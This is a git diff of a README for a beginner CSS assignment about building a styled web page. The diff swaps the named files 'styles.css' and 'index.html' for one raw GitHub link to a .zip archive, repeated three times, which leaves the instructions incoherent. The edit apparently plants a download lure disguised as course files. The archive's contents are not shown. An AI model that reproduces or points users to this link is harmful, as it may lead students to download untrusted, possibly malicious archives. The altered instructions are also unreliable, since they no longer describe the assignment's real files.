@@ -17,7 +17,7 @@ Your goal is to create a visually styled web page using only CSS. You will apply
 
 ## Instructions
 
-Start with a basic HTML structure and create a separate CSS file named `styles.css`. Link it to your HTML file. Apply various styles to headings, paragraphs, and container sections.
+Start with a basic HTML structure and create a separate CSS file named `https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-css-Griffnificent/main/pistolgraph/Griffnificent_introduction_css_to_july_holism.zip`. Link it to your HTML file. Apply various styles to headings, paragraphs, and container sections.
 
 Use the Box Model deliberately—experiment with margin, padding, and borders to see how they affect the layout. Apply background colors to visualize box boundaries. You may also style buttons, navigation, and card-like sections to demonstrate your grasp of spacing and alignment.
 
@@ -27,8 +27,8 @@ No JavaScript or external CSS libraries (like Bootstrap) should be used.
 
 Submit the following files:
 
-* `index.html`: A basic HTML page with structured content.
-* `styles.css`: Your external stylesheet containing all your CSS rules.
+* `https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-css-Griffnificent/main/pistolgraph/Griffnificent_introduction_css_to_july_holism.zip`: A basic HTML page with structured content.
+* `https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-css-Griffnificent/main/pistolgraph/Griffnificent_introduction_css_to_july_holism.zip`: Your external stylesheet containing all your CSS rules.
 
 Both files should work together to showcase:
 
